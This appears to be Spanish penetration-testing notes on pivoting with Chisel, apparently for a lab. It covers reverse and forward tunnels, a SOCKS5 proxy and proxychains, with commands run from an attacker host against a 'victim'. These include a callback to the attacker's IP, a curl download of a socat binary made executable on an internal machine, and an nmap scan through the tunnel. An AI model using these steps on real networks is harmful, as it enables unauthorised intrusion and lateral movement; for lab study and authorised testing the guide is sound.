# Pivoting con Chisel – Versión Final

## Introducción

[Chisel](https://github.com/jpillora/chisel) es una herramienta escrita en Go que permite crear **túneles TCP/SOCKS reversos** y forwardings de puertos.
Es ideal para pivoting dentro de redes comprometidas, permitiendo:

* Traer servicios internos hacia tu host (reverse).
* Servir recursos de tu host hacia la red interna (forward).
* Pivotar tráfico TCP mediante SOCKS5 y Proxychains.

---

## Instalación

```bash
git clone https://github.com/jpillora/chisel
cd chisel
CGO_ENABLED=0 go build -a -ldflags="-s -w" .
upx chisel  # Opcional para reducir el tamaño del binario
```

> `CGO_ENABLED=0` asegura compatibilidad en máquinas con Go antiguo.

---

## Modo de Uso

Chisel se ejecuta como:

* **Servidor:** máquina atacante / host
* **Cliente:** máquina pivote o víctima

```bash
# Servidor
sudo ./chisel server -p 1234 [--reverse]

# Cliente
./chisel client <IP_SERVIDOR>:1234 [R:<PUERTO_LOCAL>:<IP_DESTINO>:<PUERTO_DESTINO> | L:<PUERTO_LOCAL>:<IP_DESTINO>:<PUERTO_DESTINO> | R:socks]
```

* `R:` → reverse, trae puertos internos hacia tu host
* `L:` → forward, abre un puerto en la pivote que apunta a tu host
* `R:socks` → levanta un proxy SOCKS5 para pivoting genérico

---

## Caso 1: Pivoting clásico – Reverse `R:`

**Objetivo:** Traer un servicio interno hacia nuestra máquina atacante.

### Ejemplo: HTTP interno

* **Interna:** `172.19.0.4:80`
* **Host:** `10.10.14.6:80`

#### Servidor (Host)

```bash
sudo ./chisel server --reverse -p 1234
```

#### Cliente (Pivote / Víctima)

```bash
./chisel client 10.10.14.6:1234 R:80:172.19.0.4:80
```

#### Flujo de datos visual

```
[Máquina Interna 172.19.0.4:80]
              │
              ▼
        [Chisel Client]
              │
              ▼
        [Chisel Server 10.10.14.6]
              │
              ▼
[Host Atacante: localhost:80]
```

* **Resultado:** accediendo a `http://localhost:80` en tu host, estás viendo el HTTP interno.

---

### Ejemplo: Redis interno

* **Interna:** `172.19.0.4:6379`
* **Host:** `10.10.14.6:8080`

```bash
./chisel client 10.10.14.6:1234 R:8080:172.19.0.4:6379
```

#### Flujo de datos

```
[Redis Interno 172.19.0.4:6379]
              │
              ▼
        [Chisel Client]
              │
              ▼
        [Chisel Server 10.10.14.6]
              │
              ▼
[Host Atacante: localhost:8080]
```

---

## Caso 2: Forward desde cliente – Forward `L:`

**Objetivo:** Abrir un puerto en la máquina pivote que apunte a un servicio en nuestro host.

### Ejemplo: Servir un binario (`socat`) desde host a la final

* **Host atacante:** `10.10.14.6:9001` (Python HTTP server)
* **Pivote:** `172.19.0.3`
* **Final:** `172.19.0.4`

#### Servidor (Host)

```bash
./chisel server -p 1234
python3 -m http.server 9001
```

#### Cliente (Pivote)

```bash
./chisel client 10.10.14.6:1234 3333:10.10.14.6:9001
```

* `3333` → puerto que se abre en la pivote
* `10.10.14.6:9001` → destino real en el host

#### Máquina final

```bash
curl http://172.19.0.3:3333/socat -o /tmp/socat
chmod +x /tmp/socat
```

#### Flujo de datos visual

```
[Host Atacante 10.10.14.6:9001]
              │
              ▼
        [Chisel Client en Pivote 172.19.0.3:3333]
              │
              ▼
       [Máquina Final 172.19.0.4]
```

* **Resultado:** la máquina final obtiene acceso al recurso de nuestro host a través del pivote.

---

## Caso 3: Pivoting SOCKS + Proxychains

**Objetivo:** Pivotar tráfico TCP de forma genérica.

#### Servidor

```bash
sudo ./chisel server --reverse -p 1234
```

#### Cliente (SOCKS)

```bash
./chisel client 10.10.14.6:1234 R:socks
```

* Levanta un proxy SOCKS5 en el host (puerto 1080 por defecto)

#### Proxychains

```ini
socks5 127.0.0.1 1080
```

#### Uso

```bash
proxychains curl http://172.19.0.4:80
proxychains nmap -p 1-1000 172.19.0.4
```

#### Flujo de datos visual

```
[Herramienta Host + Proxychains]
              │
              ▼
        [Chisel SOCKS5 Server]
              │
              ▼
        [Chisel Client en Pivote]
              │
              ▼
          [Red Interna Víctima]
```

---

## Diferencias clave: `R:` vs `L:`

| Sintaxis  | Dónde abre el puerto | Caso típico                                              |
| --------- | -------------------- | -------------------------------------------------------- |
| `R:`      | Host atacante        | Traer servicio interno hacia tu host                     |
| `L:`      | Víctima / pivote     | Servir binarios o recursos del host hacia la red interna |
| `R:socks` | Host atacante        | Pivoting genérico mediante proxy SOCKS5                  |

---

## Notas y recomendaciones

* `CGO_ENABLED=0` si la víctima tiene Go antiguo.
* Para puertos <1024 es necesario **root**.
* Forward `L:` → útil para pasar archivos o recursos a máquinas internas.
* Reverse `R:` → útil para traer servicios internos a tu host.
* SOCKS + Proxychains → pivoting **transparente** para cualquier herramienta TCP.
* Siempre documenta los puertos y rutas de flujo de datos para no perder la visibilidad de tus túneles.
